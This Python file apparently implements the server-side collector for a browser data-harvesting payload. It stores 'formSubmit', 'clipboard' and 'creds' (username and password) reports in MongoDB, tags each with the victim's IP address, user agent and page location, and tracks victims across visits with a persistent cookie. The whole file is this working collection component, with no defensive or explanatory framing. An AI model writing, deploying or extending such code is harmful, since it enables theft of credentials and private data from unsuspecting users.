from motor.motor_tornado import MotorClient
from bson.objectid import ObjectId
from tornado.gen import coroutine as tornado_coroutine, Return

from datetime import datetime


class ReportCollector:
    def __init__(self, db_desc):
        self.db_desc = db_desc
        self.db = None
        self._setup_db()

    def _setup_db(self):
        #db_client = MotorClient("localhost")
        db_client = MotorClient(self.db_desc)
        self.db = db_client["ReportCollector"]

    def get_users_table(self):
        if not self.db:
            self._setup_db()
        return self.db["Users"]

    @tornado_coroutine
    def get_users(self, offset=0, limit=100):
        users_cursor = self.get_users_table().find({},
                                                   skip=offset,
                                                   limit=limit)
        users = yield users_cursor.to_list(limit)
        raise Return(users)

    @tornado_coroutine
    def get_user(self, user_id):
        user = yield self.get_users_table().find_one({"_id": ObjectId(user_id)})
        raise Return(user)

    @tornado_coroutine
    def save(self, report_info, request_handler):
        # Ensure that there are not any rogue values
        report = self.rebuild_report(report_info)
        # Append additional data
        report["ts"] = datetime.now()
        report["ip"] = request_handler.get_remote_ip()

        # Retrieve existing user from db or create new
        user_id_cookie = request_handler.get_secure_cookie("id")
        user = None
        if user_id_cookie:
            user = yield self.get_users_table().find_one_and_update({"_id": ObjectId(request_handler.get_secure_cookie("id"))},
                                                                    {"$push": {"reports": report}})

        if user:
            user_id = user["_id"]
        else:
            user = {
                "user_agent": request_handler.request.headers.get("User-Agent"),
                "reports": [report]
            }
            inserted_user = yield self.get_users_table().insert_one(user)
            user_id = inserted_user.inserted_id

        request_handler.set_secure_cookie("id", str(user_id))

    @staticmethod
    def rebuild_report(report_info):
        report_data = report_info["data"]
        report_data_type = report_info["type"]
        if report_data_type == "formSubmit":
            report_data_keys = ["act", "meth", "data"]
        elif report_data_type == "clipboard":
            report_data_keys = ["type", "data"]
        elif report_data_type == "creds":
            report_data_keys = ["user", "pass"]
        else:
            raise Exception("Invalid report data type: %s" % report_data_type)

        report = {
            "loc": report_info["loc"],
            "type": report_data_type,
            "data": {key: report_data[key] for key in report_data_keys},
        }

        return report
